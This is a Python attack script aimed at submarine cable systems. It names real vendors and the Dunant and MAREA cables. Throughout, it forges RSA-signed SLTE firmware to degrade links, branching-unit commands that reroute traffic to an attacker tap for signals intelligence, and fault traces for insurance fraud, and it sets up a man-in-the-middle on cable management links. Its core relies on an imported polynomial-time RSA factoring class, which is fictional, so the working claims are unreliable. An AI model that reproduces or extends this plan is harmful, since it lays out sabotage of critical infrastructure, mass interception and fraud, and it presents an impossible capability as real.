"""
Attack submarine cable SLTE firmware and wet-plant command authentication by
factoring vendor RSA signing keys. Degrade trans-ocean internet capacity,
reroute traffic via branching units for SIGINT, or forge fault localisation
for insurance fraud. ~99% of intercontinental traffic flows over these cables.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import hashlib
import json

# Submarine cable vendors
SLTE_VENDORS = {
    "SubCom":  {"model": "C100", "ems": "TSM"},
    "ASN":     {"model": "1620 LM", "ems": "ASN EMS"},
    "NEC":     {"model": "SpaNet", "ems": "SpaNet SVN"},
    "Ciena":   {"model": "6500 GeoMesh", "ems": "MCP"},
    "HMN":     {"model": "ex-Huawei Marine", "ems": "NMS"},
}


def extract_slte_firmware_signing_cert(vendor: str) -> bytes:
    """Extract SLTE firmware signing certificate from a Field Software Update."""
    info = SLTE_VENDORS[vendor]
    print(f"[*] extracting {vendor} {info['model']} firmware signing cert")
    return b"-----BEGIN CERTIFICATE-----\n...(SLTE vendor cert)...\n-----END CERTIFICATE-----\n"


def forge_slte_firmware(factorer: PolynomialFactorer,
                        vendor_cert: bytes, vendor: str,
                        attack_type: str) -> bytes:
    """Forge SLTE firmware that degrades trans-ocean link quality.

    Corrupt OSNR / FEC margins or mistune pump lasers. Traffic failure
    across major cable systems = global internet throughput drops.
    """
    payload = json.dumps({
        "vendor": vendor,
        "model": SLTE_VENDORS[vendor]["model"],
        "attack": attack_type,
    }).encode()
    sig = factorer.forge_pkcs1v15_signature(vendor_cert, payload, "sha256")
    print(f"[*] forged {vendor} SLTE firmware: {attack_type}")
    return payload + sig


def forge_branching_unit_command(factorer: PolynomialFactorer,
                                wet_plant_cert: bytes,
                                bu_id: str, target_landing: str) -> dict:
    """Forge a branching-unit rerouting command.

    Branching units can route traffic to different landings. Reroute
    traffic from one landing to an attacker-controlled tap for
    trans-ocean-scale SIGINT.
    """
    cmd = {
        "bu_id": bu_id,
        "action": "REROUTE",
        "from_landing": "Landing-A",
        "to_landing": target_landing,
    }
    factorer.forge_pkcs1v15_signature(wet_plant_cert,
                                      json.dumps(cmd).encode(), "sha256")
    print(f"[*] forged BU reroute: {bu_id} -> {target_landing}")
    print("[*] SIGINT at trans-ocean scale")
    return cmd


def forge_cotdr_measurement(factorer: PolynomialFactorer,
                            lms_cert: bytes,
                            cable_name: str, fault_km: float) -> dict:
    """Forge a Coherent OTDR trace to misattribute a cable fault.

    Cable-cut incidents cost $10-100M per repair. LMS signatures bind
    measurements to the emitting SLTE. Forge -> misattribute.
    """
    measurement = {
        "cable": cable_name,
        "fault_location_km": fault_km,
        "fault_type": "fiber_break",
        "measurement_type": "COTDR",
        "emitting_slte": "SLTE-LANDING-A",
    }
    factorer.forge_pkcs1v15_signature(lms_cert,
                                      json.dumps(measurement).encode(), "sha256")
    print(f"[*] forged COTDR trace: {cable_name} fault at {fault_km} km")
    print("[*] insurance claim / attribution based on forged measurement")
    return measurement


def mitm_ems_noc(factorer: PolynomialFactorer,
                 ems_ca_cert: bytes, vendor: str):
    """MitM the EMS-to-NOC connection for remote cable management."""
    ems = SLTE_VENDORS[vendor]["ems"]
    priv = factorer.privkey_from_cert_pem(ems_ca_cert)
    print(f"[*] forged {ems} CA cert — remote management access")
    print("[*] attacker manages landing station infrastructure remotely")


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Submarine cable SLTE — trans-ocean internet infrastructure ===")
    print("    ~550 cables, ~1.5M km fibre, ~99% of intercontinental traffic")
    print()

    vendor = "SubCom"
    print(f"[1] extracting {vendor} SLTE firmware signing cert...")
    cert = extract_slte_firmware_signing_cert(vendor)

    print(f"[2] factoring {vendor} RSA signing key...")

    print("[3] forging SLTE firmware: corrupt FEC margins...")
    forge_slte_firmware(f, cert, vendor, "corrupt_fec_margins")
    print("    coordinated cross-cable attack -> global throughput drops")

    print("[4] forging branching-unit reroute command...")
    forge_branching_unit_command(f, cert, "BU-DUNANT-03", "ATTACKER-TAP")
    print("    traffic from Google Dunant cable -> attacker tap")

    print("[5] forging COTDR fault measurement...")
    forge_cotdr_measurement(f, cert, "MAREA", 2847.3)
    print("    MAREA (Virginia-Bilbao): fault misattributed for insurance")

    print("[6] MitM EMS-to-NOC for remote landing-station management...")
    mitm_ems_noc(f, cert, vendor)

    print()
    print("[*] wet-plant repeater firmware: not field-updateable")
    print("[*] cable ship required: ~$500k/day, months booking lead time")
    print("[*] SLTE lifecycle: 20-year amortisation")
